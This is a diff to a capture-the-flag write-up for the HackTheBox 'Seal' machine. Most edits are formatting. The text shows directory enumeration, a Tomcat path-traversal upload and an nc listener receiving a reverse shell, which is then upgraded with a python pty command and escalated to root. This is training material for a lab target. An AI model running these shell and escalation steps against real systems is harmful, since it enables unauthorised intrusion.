@@ -104,6 +104,7 @@ On port 8080 we got tomcat credentials
 
 #### Dirsearch
 
+```bash
 ┌──(arundhanush㉿kali)-[~/CTF/HTB/Seal]
 └─$ dirsearch -u https://seal.htb                                               
 /home/arundhanush/.local/lib/python3.9/site-packages/requests/__init__.py:89: Re version!
@@ -138,12 +139,13 @@ Target: https://seal.htb/
 	[09:55:06] 302 -    0B  - /manager  ->  http://seal.htb/manager/     
 	                                                                            
 	Task Completed      
+```
 
-In this dirsearch /manager/status/all is tomcat we would login with our crendentials
+In this dirsearch /manager/status/all is tomcat lets login with our crendentials
 
+Its tomcat/9.0.31 vulnerable to path traversal we have to upload a file  
 
-its tomcat/9.0.31 vulnerable to path traversal we have to upload a file  
-
+```bash
 ┌──(arundhanush㉿kali)-[~/CTF/HTB/Seal]
 └─$ nc -nlvp 1234                                                                                                                                               130 ⨯
 Listening on 0.0.0.0 1234
@@ -152,7 +154,7 @@ id
 uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@seal:/var/lib/tomcat9$    
-
+```
 
 ## Privesc
 
@@ -175,7 +177,5 @@ tomcat@seal:/var/lib/tomcat9$
 	TASK [shell] *********************************************************************************************************************************************************
 	# id
 	uid=0(root) gid=0(root) groups=0(root)
-	# cd /root
-	# cat root.txt  
-	cee3055bda7cb9020601d6124a74d95e
-	# 
+	
+## Rooted
